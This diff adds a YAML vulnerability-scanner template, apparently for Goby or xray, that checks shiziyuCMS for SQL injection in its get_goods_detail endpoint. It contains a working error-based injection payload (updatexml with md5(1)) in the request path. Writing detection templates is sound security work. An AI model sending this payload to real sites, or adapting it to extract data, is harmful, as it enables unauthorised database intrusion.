@@ -1,0 +1,20 @@
+name: shiziyuCMS ApigoodController.class.php SQL
+manual: true
+query: title="系统"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /index.php?s=apigoods/get_goods_detail&id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1)
+      headers:
+        User-Agent: Mozilla/5.0(X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0
+      follow_redirects: true
+    expression: response.status == 404 && response.body.bcontains(b"c4ca4238a0b923820dcc509a6f75849")
+expression: r0()
+detail:
+  author: gobysec@gmail.com
+  links:
+  - https://gobies.org/
+  description: 狮子鱼CMS ApiController.class.php 参数过滤存在不严谨，导致SQL注入漏洞
+  tags: sqli
